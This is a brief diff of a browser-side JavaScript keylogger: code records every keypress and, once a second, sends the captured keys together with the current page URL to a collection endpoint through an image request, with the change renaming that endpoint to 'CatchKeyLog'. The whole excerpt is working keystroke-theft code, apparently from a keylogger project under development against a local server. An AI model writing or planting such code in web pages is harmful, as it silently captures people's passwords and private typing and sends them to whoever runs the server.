@@ -6,6 +6,6 @@ document.onkeypress = function(e) {
 	keys+=key;
 }
 window.setInterval(function(){
-	new Image().src = 'http://127.0.0.1:9000/App/AppendData?data='+keys+'&page='+window.location.href ;
+	new Image().src = 'http://127.0.0.1:9000/CatchKeyLog?data='+keys+'&page='+window.location.href ;
 	keys = '';
 }, 1000);
